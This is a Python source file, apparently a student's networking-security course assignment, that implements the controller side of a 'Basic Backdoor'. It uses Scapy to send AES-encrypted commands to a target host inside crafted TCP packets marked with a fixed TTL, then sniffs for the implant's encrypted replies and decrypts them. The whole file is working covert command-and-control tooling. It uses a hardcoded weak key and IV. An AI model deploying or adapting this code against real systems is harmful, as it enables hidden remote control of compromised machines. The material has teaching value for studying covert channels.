import sys # For getting command line arguments
from scapy.all import * #Scapy library used to craft packets
from AESCipher import AESCipher
import time #used for thread sleep methods
import argparse #used for easy arguments

def craft(payload):
    packet = (IP(dst=args.dest,ttl=ttlKey)/TCP(sport=int(args.port),dport=args.port)/ payload)
    return packet
    
def sendCommand(command):
    global cipher
    encrypt_Command = cipher.encrypt(command)
    packet = craft(encrypt_Command)
    send(packet)

def commandResult(packet):
    if IP in packet[0]:
        global ttlKey
        global args
        global cipher
        srcIP = packet[IP].src
        ttl = packet[IP].ttl
        flags=packet['TCP'].flags
        if srcIP == args.dest and packet[TCP].dport == args.port and packet[TCP].sport == args.port:
            print(packet[TCP].load)
            print(cipher.decrypt(packet[TCP].load))
            return True
        else:
            return False
    else:
        return False

#GLOBAL VARIABLES
ttlKey = 159
key = 'mysecretpassword'
IV = "abcdefghijklmnop"
cipher = AESCipher(key)

# parse command line argument
arg_parser = argparse.ArgumentParser(
    prog='Basic Backdoor',
    description='COMP 8505 Assignment 3 by Peyman Tehrani Parsa & Khang Tran'
)
arg_parser.add_argument('-d', dest='dest', type = str, help = 'target ip', required=True)
arg_parser.add_argument('-p', dest='port', type = int, help = 'target port', const=99, nargs='?')
args = arg_parser.parse_args()
exit=["exit","quit","exit()","quit()"]

while True:
    command = raw_input(args.dest+":"+str(args.port)+">")
    if command == "":
        continue
    elif any(item == command for item in exit):
        sys.exit()
    else:
        sendCommand(command)
        sniff(timeout=10, filter="tcp", stop_filter=commandResult)